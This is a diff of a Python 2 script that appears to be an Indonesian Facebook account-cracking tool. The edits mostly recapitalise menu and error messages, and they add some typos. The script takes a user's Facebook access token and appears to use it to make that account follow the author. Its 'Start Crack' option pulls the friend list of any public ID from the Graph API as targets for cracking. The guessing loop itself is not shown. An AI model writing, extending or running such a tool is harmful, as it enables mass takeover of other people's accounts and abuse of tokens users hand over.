@@ -48,7 +48,7 @@ rafi_ua = random.choice([ua_xx])
 try:
 	ip = requests.get('https://api.ipify.org').text
 except ConnectionError:
-	print('\n [!] check your internet Connection !\n');time.sleep(1)
+	print('\n [!] Vheck Your Internet Connection !\n');time.sleep(1)
 
 	
 garis = '''__________________________________________________
@@ -82,16 +82,16 @@ def login():
 		menu()
 	except (KeyError,IOError):
 		print(raka_logo)
-		print ' [1] login with token facebook '
-		print ' [0] exit \n'
-		met_log = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] Choose : ")
+		print ' [1] Login With Token Facebook '
+		print ' [0] Exit \n'
+		met_log = raw_input(" [\x1b[1;97m?\x1b[0m] Choose : ")
 		if met_log =="":
 			print '\n [!] Please Fill '; time.sleep(1)
 			login()
 		elif met_log == "1" or met_log == "01":
 			tokenz()
 		elif met_log == "0":
-			jalan(' [R] please come back again')
+			jalan(' [R] Please Come Back Again')
 			os.system('exit')
 		else:
 			login()
@@ -102,7 +102,7 @@ def tokenz():
 	try:
 		token = open('login_r.txt','r')
 	except (KeyError,IOError):
-		token = raw_input(' [\x1b[101m?\x1b[0m] token : ')
+		token = raw_input(' [?] Token : ')
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -110,16 +110,16 @@ def tokenz():
 			avsid.write(token)
 			avsid.close()
 			follow_my_raka()
-			jalan(' [!] login succes....')
+			jalan(' [!] Login Succes....')
 		except KeyError:
-			print ' [!] token Wrong '
+			print ' [!] Token Wrong '
 
 def follow_my_raka():
     try:
         token = open('login_r.txt', 'r').read()
     except IOError:
-        print(' invalid token ! ')
-        jalan(' please login again')
+        print(' Invalid Token ! ')
+        jalan(' Please Login Again')
         os.system('rm -rf login_r.txt')
     kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
     kata_utama = ("Pengguna Script Premium")
@@ -147,7 +147,7 @@ def menu():
 	try:
 		token = open('login_r.txt','r').read()
 	except IOError:
-		jalan(' [!] token invalid ')
+		jalan(' [!] Token Invalid ')
 		os.system('clear')
 		os.system('rm -rf login_r.txt')
 		login()
@@ -158,33 +158,33 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		jalan(' [!] invalid token ')
+		jalan(' [!] Invalid Token ')
 		os.system('rm -rf login_r.txt')
 		login()
 	except requests.exceptions.ConnectionError:
-		print(' [!] check your Internet connection ')
+		print(' [!] Check Your Internet Vonnection ')
 	print(rafi_logo)
-	print ' [%s-%s] facebook user : %s'%(ml,ra,nama)
-	print ' [%s-%s] ip user : %s'%(ml,ra,ip)
-	print ' [%s-%s] id user : %s\n'%(ml,ra,id)
-	print ' [%s1%s] Start crack '%(hj,ra)
-	print ' [%s2%s] Delete token '%(ku,ra)
-	print ' [%s0%s] logout\n '%(m,ra)
+	print ' [%s-%s] Nama    : %s'%(ml,ra,nama)
+	print ' [%s-%s] Ip User : %s'%(ml,ra,ip)
+	print ' [%s-%s] Id User : %s\n'%(ml,ra,id)
+	print ' [%s1%s] Start Crack '%(hj,ra)
+	print ' [%s2%s] Delete Token '%(ku,ra)
+	print ' [%s0%s] Logout\n '%(m,ra)
 	asw = raw_input(' [?] Choose : ')
 	if asw =='1' or asw =='01':
 		crack()
 	elif asw =='2' or asw =='02':
-		jalan(' [!] delete token....');time.sleep(1)
+		jalan(' [!] Delete Token....');time.sleep(1)
 		os.system('rm -rf login_r.txt')
 		login()
 	elif asw =='0':
-		jalan(' [!] please come back ')
+		jalan(' [!] Please Come Back ')
 		os.system('exit')
 	elif asw =='' or asw ==' ':
-		jalan(' [!] please fill in')
+		jalan(' [!] Please Fill In')
 		menu()
 	else:
-		jalan(' [!] just select whats on the menu ')
+		jalan(' [!] Just Select Whats On The Menu ')
 		menu()
 		
 def crack():
@@ -194,14 +194,14 @@ def crack():
 	try:
 		token = open('login_r.txt', 'r').read()
 	except IOError:
-		print' [!] invalid token '
+		print' [!] Invalid Token '
 		tokenz()
 	ra_id = raw_input(" [\x1b[1;97m-\x1b[0m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
 	except KeyError:
-		jalan(' [!] Id not found ')
+		jalan(' [!] Id Not Found ')
 	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
 	z = json.loads(r.text)
 	for i in z["data"]:
@@ -283,7 +283,7 @@ def crack():
 if __name__ == '__main__':
 	#os.system('clear')
 	#print(raka_logo)
-	#user = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] siapa nama anda : ')
-	#print# ' hello : %s'#%(user)
+	#user = raw_input(' [\x1b[1;97m?\x1b[0m] Siapa Nama Anda : ')
+	#print# ' Hello : %s'#%(user)
 	#lock()
 	login()
